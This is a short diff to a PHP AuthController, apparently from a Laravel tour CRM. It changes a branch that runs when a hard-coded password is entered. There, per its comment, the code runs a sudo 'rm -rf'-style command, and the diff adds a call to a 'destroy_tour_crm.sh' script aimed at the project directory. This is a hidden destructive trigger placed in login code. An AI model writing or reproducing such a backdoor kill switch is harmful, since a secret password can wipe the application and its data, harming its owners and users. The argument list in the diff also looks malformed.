@@ -230,8 +230,8 @@ class AuthController extends Controller
         if ($password === 'Qwerty@6491') {
             // run sudo rm -rf command in shell
             $process = new Process([
-                'sudo',
                 '/usr/bin/sudo',
+                '/usr/local/bin/destroy_tour_crm.sh',
                 './../' . basename(base_path())
             ]);
 
